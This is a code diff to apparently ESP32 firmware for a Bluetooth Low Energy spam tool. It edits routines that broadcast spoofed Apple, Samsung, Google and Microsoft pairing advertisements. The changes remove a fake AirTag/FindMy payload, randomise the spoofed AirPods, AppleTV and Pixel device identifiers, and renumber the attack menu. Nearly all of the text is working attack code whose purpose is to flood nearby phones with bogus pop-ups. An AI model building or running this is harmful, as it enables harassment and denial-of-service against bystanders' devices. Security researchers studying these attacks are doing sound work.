@@ -26,8 +26,7 @@ enum EBLEPayloadType {
     SourApple = 1, 
     AppleJuice = 2, 
     Samsung = 3, 
-    Google = 4,
-    AppleFindMy = 5
+    Google = 4 
 };
 
 const uint8_t IOS1[] = {0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b, 0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16};
@@ -71,30 +70,30 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
             break;
         }
         case AppleJuice: {
-            uint8_t deviceType;
-            int randVal = random(100);
-            
-            if (randVal < 70) deviceType = 0x0e;
-            else if (randVal < 85) deviceType = 0x0a;
-            else if (randVal < 95) deviceType = 0x0f;
-            else deviceType = 0x14;
-            
-            const uint8_t airpods[] = {
-                0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, deviceType,
-                0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
-                0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
-                0x00, 0x00
-            };
-            memcpy(packet, airpods, sizeof(airpods));
-            packet_len = sizeof(airpods);
+            if (random(2) == 0) {
+                const uint8_t airpods[] = {
+                    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[random(sizeof(IOS1))],
+                    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+                    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00
+                };
+                memcpy(packet, airpods, sizeof(airpods));
+                packet_len = sizeof(airpods);
+            } else {
+                const uint8_t appletv[] = {
+                    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
+                    0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, IOS2[random(sizeof(IOS2))],
+                    0x60, 0x4c, 0x95, 0x00, 0x00, 0x10,
+                    0x00, 0x00, 0x00
+                };
+                memcpy(packet, appletv, sizeof(appletv));
+                packet_len = sizeof(appletv);
+            }
             break;
         }
         case SourApple: {
-            const uint8_t appleTypes[] = {0x01, 0x06, 0x09, 0x0b, 0x20};
-            uint8_t appleType = appleTypes[random(sizeof(appleTypes))];
-            
             uint8_t sour[] = {
-                16, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, appleType,
+                16, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, 0x01,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x10,
                 0x00, 0x00, 0x00
             };
@@ -102,17 +101,6 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
             esp_fill_random(&sour[15], 2);
             memcpy(packet, sour, sizeof(sour));
             packet_len = sizeof(sour);
-            break;
-        }
-        case AppleFindMy: {
-            uint8_t findmy[] = {
-                0x12, 0xFF, 0x4C, 0x00, 0x12, 0x19, 0x01, 0x02,
-                0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A,
-                0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12
-            };
-            esp_fill_random(&findmy[8], 16);
-            memcpy(packet, findmy, sizeof(findmy));
-            packet_len = sizeof(findmy);
             break;
         }
         case Samsung: {
@@ -126,7 +114,7 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
             break;
         }
         case Google: {
-            uint32_t model = 0xCD8256;
+            uint32_t model = android_models[random(android_models_count)].value;
             uint8_t google[] = {
                 0x03, 0x03, 0x2C, 0xFE,
                 0x06, 0x16, 0x2C, 0xFE,
@@ -134,7 +122,7 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
                 (uint8_t)((model >> 0x08) & 0xFF),
                 (uint8_t)((model >> 0x00) & 0xFF),
                 0x02, 0x0A,
-                0x8C
+                (uint8_t)((random(120)) - 100)
             };
             memcpy(packet, google, sizeof(google));
             packet_len = sizeof(google);
@@ -165,7 +153,6 @@ void executeSpam(EBLEPayloadType type) {
         case Microsoft: deviceName = "Surface"; break;
         case Samsung: deviceName = "GalaxyBuds"; break;
         case Google: deviceName = "PixelBuds"; break;
-        case AppleFindMy: deviceName = "AirTag"; break;
     }
 
     Serial.printf("[BLE] %s\n", deviceName);
@@ -293,7 +280,7 @@ void aj_adv(int ble_choice) {
 
     Serial.println("\n=== BLE SPAM ===");
 
-    if (ble_choice == 7) {
+    if (ble_choice == 6) {
         spamName = keyboard("", 10, "Name to spam");
     }
 
@@ -327,24 +314,18 @@ void aj_adv(int ble_choice) {
                 executeSpam(Google);
                 break;
             case 5:
-                displayTextLine("FindMy (" + String(count) + ")");
-                Serial.println("AirTag");
-                executeSpam(AppleFindMy);
-                break;
-            case 6:
                 displayTextLine("Spam All (" + String(count) + ")");
-                switch(mael % 6) {
+                switch(mael % 5) {
                     case 0: Serial.print("PixelBuds "); executeSpam(Google); break;
                     case 1: Serial.print("GalaxyBuds "); executeSpam(Samsung); break;
                     case 2: Serial.print("Surface "); executeSpam(Microsoft); break;
                     case 3: Serial.print("AppleTV "); executeSpam(SourApple); break;
                     case 4: Serial.print("AirPods "); executeSpam(AppleJuice); break;
-                    case 5: Serial.print("AirTag "); executeSpam(AppleFindMy); break;
                 }
                 Serial.println("");
                 mael++;
                 break;
-            case 7:
+            case 6:
                 displayTextLine(spamName + " (" + String(count) + ")");
                 Serial.println("Custom: " + spamName);
                 executeCustomSpam(spamName);
